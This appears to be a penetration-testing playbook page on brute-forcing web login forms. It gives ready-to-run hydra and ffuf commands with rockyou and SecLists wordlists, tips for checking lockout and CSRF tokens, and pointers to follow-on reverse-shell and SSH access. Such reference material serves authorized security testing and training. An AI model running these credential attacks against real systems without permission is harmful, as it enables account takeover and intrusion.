---
id: web-brute
title: Web Login Bruteforce
stage: initial-access
tags: [web, linux, windows]
summary: Bruteforce HTTP login forms and admin panels with hydra or ffuf when default credentials fail and there is no account lockout in place.
leads_to:
  - rev-shell
  - ssh-access
  - sqli-rce
---

## Prerequisites

A login form discovered during web-enum. Confirm **no lockout policy** exists before running — submit a few intentional wrong passwords and verify the account stays accessible.

## Step 1 — Capture the Form Request

Open browser DevTools → Network tab, submit the login form, then copy the request body exactly. You need:
- The POST path (e.g. `/admin/login.php`)
- Every form field name (e.g. `username=admin&password=test&submit=Login`)
- The string shown on a **failed** login (e.g. `Invalid credentials`)

## Quick Win — Hydra HTTP POST Form

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

## Hydra Syntax Breakdown

```
"<path>:<post_body>:<failure_string>"
^USER^   → replaced with each username
^PASS^   → replaced with each password
```

**HTTPS target:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET \
  https-post-form "/admin/login:username=^USER^&password=^PASS^:Incorrect password"
```

**Unknown username — spray both:**
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt $TARGET \
  http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
```

**HTTP GET form (basic auth / query string login):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-get-form "/login?user=^USER^&pass=^PASS^:Invalid"
```

**HTTP Basic Auth:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-get /admin/
```

## Wordlist Priority

```
1. /usr/share/seclists/Passwords/Common-Credentials/best110.txt  (fast, try first)
2. /usr/share/seclists/Passwords/darkweb2017-top10000.txt
3. /usr/share/wordlists/rockyou.txt                              (full run)
4. cewl http://$TARGET -d 3 -m 5 > cewl.txt                     (target-specific)
```

## ffuf Alternative

```bash
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ \
  -u http://$TARGET/login \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302 -fs <failed_response_size>
```

## CSRF Tokens

If the login form has a CSRF token field, hydra cannot handle it natively — use Burp Intruder with a session-handling macro, or a custom Python script that fetches a fresh token per request.

Check for CSRF tokens:
```bash
curl -s http://$TARGET/login | grep -i "csrf\|token\|nonce" | head -5
```

## Leads To

Admin panel access → look for file upload, command execution, or backup download (rev-shell). Credentials valid on SSH or WinRM → ssh-access. App with SQLi exposure → sqli-rce.
